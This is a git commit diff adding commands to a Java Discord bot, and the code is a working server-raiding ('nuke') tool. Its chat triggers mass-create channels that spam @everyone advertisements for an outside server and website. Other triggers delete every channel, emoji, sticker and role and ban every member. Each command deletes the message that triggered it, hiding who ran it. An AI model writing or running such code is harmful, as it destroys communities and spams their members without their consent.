27e71d8ce1430e8c5af3c5efdfd165148d94cb5e
root <92541374+rootuwu@users.noreply.github.com>
2022-12-05 20:07:33 +0000

    add commands

--- src/main/java/wtf/gun/maou/Bot.java
+++ src/main/java/wtf/gun/maou/Bot.java
@@ -29,6 +29,120 @@ public final class Bot {
                 .build()
                 .awaitReady();
     }
-    
+
+    // Create x channels and spam message x times in each channel
+    private static final class Create extends ListenerAdapter {
+        @Override
+        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!hi")) return;
+            Guild guild = event.getGuild();
+
+            for (int i = 0; i < 25; i++) {
+                guild.createTextChannel("gg-1hunna").queue(textChannel -> {
+                    for (int j = 0; j < 50; j++) {
+                        try {
+                            textChannel.sendMessage("@everyone" +
+                                    "\n" +
+                                    "/1\uD835\uDD8D\uD835\uDD9A\uD835\uDD93\uD835\uDD93\uD835\uDD86 is an upcoming Community Server, giving back to the community hosting Nitro, PayPal & more prizes in Giveaways." +
+                                    "\n" +
+                                    "Discord: discord.gg/1hunna" +
+                                    "\n" +
+                                    "Website: https://1hunna.club").queue();
+                        } catch (Exception ignored) {}
+                    }
+                });
+            }
+            event.getMessage().delete().queue();
+        }
+    }
+
+    // Delete all channels, emojis, stickers, roles, ban all members
+    private static final class Nuke extends ListenerAdapter {
+        @Override
+        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!yeet")) return;
+            Guild guild = event.getGuild();
+
+            guild.getChannels().forEach(guildChannel -> guildChannel.delete().queue());
+            guild.getEmojis().forEach(richCustomEmoji -> richCustomEmoji.delete().queue());
+            guild.getStickers().forEach(guildSticker -> guildSticker.delete().queue());
+            guild.getRoles().forEach(role -> {
+                try {
+                    role.delete().queue();
+                } catch (Exception ignored) {
+
+                }
+            });
+            guild.getMembers().forEach(member -> {
+                try {
+                    member.ban(0, TimeUnit.SECONDS).queue();
+                } catch (Exception ignored) {
+
+                }
+            });
+            event.getMessage().delete().queue();
+        }
+    }
+
+    // Delete all emojis and stickers
+    private static final class Emoji extends ListenerAdapter {
+        @Override
+        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nomoji")) return;
+            Guild guild = event.getGuild();
+
+            guild.getEmojis().forEach(richCustomEmoji -> richCustomEmoji.delete().queue());
+            guild.getStickers().forEach(guildSticker -> guildSticker.delete().queue());
+            event.getMessage().delete().queue();
+        }
+    }
+
+    // Delete all channels
+    private static final class Channel extends ListenerAdapter {
+        @Override
+        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nochan")) return;
+            Guild guild = event.getGuild();
+
+            guild.getChannels().forEach(guildChannel -> guildChannel.delete().queue());
+            event.getMessage().delete().queue();
+        }
+    }
+
+    // Delete all roles
+    private static final class Role extends ListenerAdapter {
+        @Override
+        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!norole")) return;
+            Guild guild = event.getGuild();
+
+            guild.getRoles().forEach(role -> {
+                try {
+                    role.delete().queue();
+                } catch (Exception ignored) {
+
+                }
+            });
+            event.getMessage().delete().queue();
+        }
+    }
+
+    // Ban all memebrs
+    private static final class Member extends ListenerAdapter {
+        @Override
+        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nomem")) return;
+            Guild guild = event.getGuild();
+
+            guild.getMembers().forEach(member -> {
+                try {
+                    member.ban(0, TimeUnit.SECONDS).queue();
+                } catch (Exception ignored) {
+
+                }
+            });
+            event.getMessage().delete().queue();
+        }
+    }
 
 }
